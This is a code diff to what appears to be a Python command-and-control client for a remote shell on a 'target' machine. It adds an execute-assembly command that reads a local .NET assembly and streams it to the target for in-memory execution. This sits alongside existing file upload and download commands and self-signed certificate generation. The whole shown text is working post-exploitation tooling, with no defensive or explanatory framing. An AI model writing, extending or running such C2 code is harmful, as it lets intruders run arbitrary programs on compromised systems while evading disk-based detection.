@@ -20,6 +20,10 @@ File transfer commands (type in the shell):
     !upload  <remote_path> <size>   → then pipe local file bytes
     !download <remote_path>         → receive file from target
     !localupload <local> <remote>   → upload local file to target
+
+Execute-assembly (in-memory .NET assembly loading):
+    !localexec <local_assembly> [args...]  → upload & execute in-memory
+    !execute-assembly <size> [args...]     → raw protocol (used by !localexec)
 """
 
 import socket
@@ -102,8 +106,12 @@ def send_loop(sock, transport):
     try:
         while True:
             line = input()
-            if line.strip().startswith("!localupload "):
-                handle_local_upload(sock, transport, line.strip())
+            stripped = line.strip()
+            if stripped.startswith("!localupload "):
+                handle_local_upload(sock, transport, stripped)
+                continue
+            if stripped.startswith("!localexec "):
+                handle_local_exec(sock, transport, stripped)
                 continue
 
             data = (line + "\n").encode()
@@ -141,6 +149,52 @@ def handle_local_upload(sock, transport, cmd: str):
             transport.send(sock, chunk)
 
     print(f"[+] Uploaded {size} bytes: {local_path} → {remote_path}")
+
+
+def handle_local_exec(sock, transport, cmd: str):
+    """
+    !localexec <local_assembly_path> [arg0 arg1 ...]
+    Reads a local .NET assembly, sends !execute-assembly command + raw bytes
+    to the target for in-memory execution.
+    """
+    parts = cmd.split(maxsplit=2)
+    if len(parts) < 2:
+        print("[!] Usage: !localexec <local_assembly.exe> [args...]")
+        return
+
+    local_path = parts[1]
+    extra_args = parts[2] if len(parts) > 2 else ""
+
+    if not os.path.isfile(local_path):
+        print(f"[!] Local file not found: {local_path}")
+        return
+
+    size = os.path.getsize(local_path)
+    assembly_name = os.path.basename(local_path)
+
+    # Build the command: !execute-assembly <size> [args...]
+    header = f"!execute-assembly {size}"
+    if extra_args:
+        header += f" {extra_args}"
+    header += "\n"
+
+    print(f"[*] Sending {assembly_name} ({size} bytes) for in-memory execution...")
+    transport.send(sock, header.encode())
+
+    # Wait for READY response — the recv_loop thread prints it to stdout,
+    # but we need to give the target time to process
+    import time
+    time.sleep(0.3)
+
+    # Send the assembly bytes
+    with open(local_path, "rb") as f:
+        while True:
+            chunk = f.read(8192)
+            if not chunk:
+                break
+            transport.send(sock, chunk)
+
+    print(f"[+] Assembly sent. Output will appear below.")
 
 
 def generate_self_signed_cert():
